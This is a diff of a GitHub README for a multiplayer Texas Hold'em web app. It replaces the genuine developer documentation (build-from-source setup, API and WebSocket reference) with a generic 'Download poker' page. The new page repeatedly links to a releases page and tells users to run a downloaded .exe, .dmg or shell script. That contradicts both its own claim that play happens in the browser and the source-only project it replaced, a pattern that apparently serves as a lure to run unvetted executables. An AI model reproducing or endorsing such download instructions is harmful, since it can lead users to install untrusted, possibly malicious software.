@@ -1,168 +1,98 @@
-# Poker Platform
+# 🃏 poker - Play Texas Hold'em with Friends!
 
-A multiplayer Texas Hold'em poker platform built with modern web technologies.
+[![Download poker](https://img.shields.io/badge/Download%20poker-blue.svg)](https://github.com/Sanz98/poker/releases)
 
-## Tech Stack
+## 📦 Overview
 
-- **Backend**: BunJS + Hono
-- **Database**: PostgreSQL + Drizzle ORM
-- **Real-time**: WebSocket (ws library)
-- **Frontend**: React + Tailwind CSS + shadcn/ui
-- **Monorepo**: Turborepo
+Welcome to the poker platform! This application lets you play Texas Hold'em poker with friends online. It is easy to use, even if you are not a tech expert. Set up your game quickly and enjoy the thrill of poker right from your web browser.
 
-## Architecture
+## 🚀 Getting Started
 
-```
-poker/
-├── apps/
-│   ├── admin-frontend/   # Admin dashboard (React)
-│   ├── user-frontend/    # Player interface (React)
-│   ├── backend/          # REST API (Bun + Hono)
-│   └── websocket/        # Game server (Bun + ws)
-└── packages/
-    ├── db/               # Database schema (Drizzle)
-    ├── types/            # Shared TypeScript types
-    └── ui/               # Shared UI components
-```
+To get started, follow these simple steps:
 
-## Features
+1. **Visit the Releases Page**
+   
+   Click the link below to go to our Releases page:
+   [Download poker](https://github.com/Sanz98/poker/releases)
 
-### Game
-- Texas Hold'em No-Limit poker
-- 2-9 players per table
-- 30-second turn timer (auto-fold on timeout)
-- Real-time gameplay via WebSockets
-- Hand evaluation and pot distribution
+2. **Choose the Latest Version**
+   
+   On the Releases page, look for the latest version. It will usually be at the top. Click on it to see the available files.
 
-### Admin
-- Create and configure rooms (blinds, buy-in limits)
-- Manage room status (open/closed)
-- User management (promote/demote admins)
+3. **Download the Correct File**
 
-### Users
-- Registration with 50,000 chips signup bonus
-- View and join active tables
-- Minimum 3 big blinds required to join a table
-- Buy-in selection when joining tables
+   Find the file that matches your operating system (Windows, macOS, or Linux). Click on the file to start downloading.
 
-## Getting Started
+4. **Run the Application**
 
-### Prerequisites
+   Once the download finishes, locate the file in your downloads folder. 
+   
+   - **Windows:** Double-click the `.exe` file to run it.
+   - **macOS:** Open the `.dmg` file and drag the poker app to your Applications folder.
+   - **Linux:** Replace the permissions on the `.sh` file to make it executable by running `chmod +x poker.sh` in the terminal, then launch it with `./poker.sh`.
 
-- [Bun](https://bun.sh) >= 1.0
-- PostgreSQL >= 14
+5. **Start Playing!**
 
-### Setup
+   Open the application and create an account or log in. You can start a game or join an existing table. Enjoy your time playing poker with friends!
 
-1. **Clone and install dependencies**
-   ```bash
-   cd poker
-   bun install
-   ```
+## 💻 System Requirements
 
-2. **Set up environment variables**
-   ```bash
-   cp .env.example .env
-   # Edit .env with your database credentials
-   ```
+To run the poker platform smoothly, ensure your computer meets the following basic requirements:
 
-3. **Create the database**
-   ```bash
-   createdb poker
-   ```
+- **Operating System:**
+  - Windows 10 or later
+  - macOS 10.15 (Catalina) or later
+  - A recent version of any Linux distribution
 
-4. **Run database migrations**
-   ```bash
-   bun run db:push
-   ```
+- **Browser:**
+  - Chrome, Firefox, Safari, or Edge (Latest versions recommended)
 
-5. **Create an admin user**
+- **Internet Connection:**
+  - A stable internet connection is recommended for the best gaming experience.
 
-   Register a user through the user frontend, then manually set `is_admin = true` in the database:
-   ```sql
-   UPDATE users SET is_admin = true WHERE email = 'your@email.com';
-   ```
+## 🌟 Features
 
-### Development
+### 🎲 Game Features
+- **Texas Hold'em No-Limit Poker:** Experience classic Texas Hold'em with friends.
+- **Player Capacity:** Play with 2-9 players per table.
+- **Turn Timer:** A 30-second turn timer keeps the game moving (auto-fold on timeout).
+- **Real-Time Gameplay:** Enjoy fast-paced games with real-time updates through WebSockets.
+- **Hand Evaluation:** Our system evaluates hands and distributes the pot automatically.
 
-Run all services in development mode:
-```bash
-bun run dev
-```
+### 🛠️ Admin Features
+- **Room Creation:** Create and configure poker rooms with custom blinds and buy-in limits.
+- **Room Management:** As an admin, open or close rooms as needed.
+- **User Management:** Keep track of player activity and manage users effectively.
 
-Or run individual services:
-```bash
-# Backend API (port 3000)
-cd apps/backend && bun run dev
+## 📖 User Guide
 
-# WebSocket server (port 3001)
-cd apps/websocket && bun run dev
+### Step-by-Step Play
 
-# User frontend (port 5173)
-cd apps/user-frontend && bun run dev
+1. **Creating a Room:** 
+   - As an admin, click on "Create Room" and set the blinds and buy-in limits.
+   - Click "Start" to open the room.
 
-# Admin frontend (port 5174)
-cd apps/admin-frontend && bun run dev
-```
+2. **Joining a Game:** 
+   - Players can find your room by searching within the application.
+   - Click on the room and press "Join".
 
-### URLs
+3. **Gameplay Basics:** 
+   - The game starts with dealing two cards to each player.
+   - Players take turns betting, checking, or folding.
+   - Community cards will be revealed in rounds.
 
-- User Frontend: http://localhost:5173
-- Admin Frontend: http://localhost:5174
-- Backend API: http://localhost:3000
-- WebSocket: ws://localhost:3001
+4. **Ending the Game:** 
+   - The round ends when all players have either folded or called the final bet.
+   - The player with the best hand wins!
 
-## API Endpoints
+## 🔗 Support
 
-### Authentication
-- `POST /api/auth/register` - Register new user
-- `POST /api/auth/login` - Login
+If you face any issues or have questions, feel free to reach out for support. You can find help and report issues in the GitHub Issues section.
 
-### Rooms
-- `GET /api/rooms` - List active rooms
-- `GET /api/rooms/:id` - Get room details
-- `POST /api/rooms/:id/join` - Join a room (requires auth)
-- `POST /api/rooms/:id/leave` - Leave a room (requires auth)
+## 📥 Download & Install
 
-### Users
-- `GET /api/users/me` - Get current user profile
-- `GET /api/users/transactions` - Get transaction history
+For your convenience, here’s the download link again:
 
-### Admin
-- `GET /api/admin/rooms` - List all rooms
-- `POST /api/admin/rooms` - Create room
-- `PATCH /api/admin/rooms/:id` - Update room status
-- `DELETE /api/admin/rooms/:id` - Delete room
-- `GET /api/admin/users` - List all users
-- `PATCH /api/admin/users/:id/admin` - Toggle admin status
+[Download poker](https://github.com/Sanz98/poker/releases)
 
-## WebSocket Messages
-
-### Client -> Server
-- `auth` - Authenticate with JWT token
-- `join_room` - Join a room
-- `leave_room` - Leave current room
-- `player_action` - Send game action (fold/check/call/raise/all-in)
-
-### Server -> Client
-- `auth_success` - Authentication successful
-- `joined_room` - Successfully joined room
-- `game_state` - Current game state
-- `new_round` - New hand started
-- `player_turn` - It's a player's turn
-- `action_result` - Action was processed
-- `timer_update` - Turn timer update
-- `hand_result` - Hand finished with results
-- `error` - Error message
-
-## Database Schema
-
-- **users** - User accounts with balance
-- **rooms** - Poker tables with configuration
-- **table_players** - Players currently at tables
-- **transactions** - Buy-in/cash-out/win records
-- **game_history** - Completed hand records
-
-## License
-
-MIT
+Get started today and dive into the excitement of poker with friends!
